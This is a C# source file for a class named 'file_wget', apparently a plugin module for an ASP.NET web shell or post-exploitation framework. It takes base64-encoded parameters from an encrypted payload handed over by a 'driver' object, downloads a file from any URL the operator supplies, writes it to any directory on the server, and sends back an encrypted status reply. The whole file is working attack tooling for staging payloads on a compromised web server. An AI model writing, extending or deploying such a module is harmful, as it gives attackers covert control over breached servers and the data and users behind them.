using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;
using System.Net;

public class file_wget
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abOutput, 1});

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    private string FormatJson(bool success, string filename, string path, string error = null)
    {
        if (success)
        {
            return $"{{\"success\":true,\"filename\":\"{EscapeJson(filename)}\",\"path\":\"{EscapeJson(path)}\"}}";
        }
        else
        {
            return $"{{\"success\":false,\"error\":\"{EscapeJson(error)}\"}}";
        }
    }

    private string EscapeJson(string s)
    {
        if (string.IsNullOrEmpty(s)) return "";
        return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);

            if (!dic.ContainsKey("z0") || !dic.ContainsKey("z1"))
            {
                string errJson = FormatJson(false, null, null, "Missing parameters.");
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(errJson));
                return true;
            }

            string szUrl = fnB64Decode(dic["z0"]);
            string szSaveDir = fnB64Decode(dic["z1"]);

            string filename = null;
            byte[] fileData = null;

            try
            {
                HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(szUrl);
                webRequest.Method = "GET";
                webRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
                webRequest.Timeout = 30000;

                using (HttpWebResponse webResponse = (HttpWebResponse)webRequest.GetResponse())
                {
                    string contentDisposition = webResponse.Headers["Content-Disposition"];
                    if (!string.IsNullOrEmpty(contentDisposition))
                    {
                        Match m = Regex.Match(contentDisposition, @"filename=""?([^"";]+)""?", RegexOptions.IgnoreCase);
                        if (m.Success)
                        {
                            filename = m.Groups[1].Value.Trim();
                        }
                    }

                    if (string.IsNullOrEmpty(filename))
                    {
                        Uri uri = new Uri(szUrl);
                        filename = Path.GetFileName(uri.AbsolutePath);
                    }

                    if (string.IsNullOrEmpty(filename) || filename == "/")
                    {
                        filename = "download.bin";
                    }

                    using (Stream responseStream = webResponse.GetResponseStream())
                    using (MemoryStream ms = new MemoryStream())
                    {
                        responseStream.CopyTo(ms);
                        fileData = ms.ToArray();
                    }
                }
            }
            catch (Exception exDownload)
            {
                string errJson = FormatJson(false, null, null, "Download failed: " + exDownload.Message);
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(errJson));
                return true;
            }

            try
            {
                if (!Directory.Exists(szSaveDir))
                {
                    Directory.CreateDirectory(szSaveDir);
                }

                string fullPath = Path.Combine(szSaveDir, filename);

                File.WriteAllBytes(fullPath, fileData);

                string successJson = FormatJson(true, filename, fullPath);
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(successJson));
            }
            catch (Exception exWrite)
            {
                string errJson = FormatJson(false, null, null, "Failed to save file: " + exWrite.Message);
                fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(errJson));
            }
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}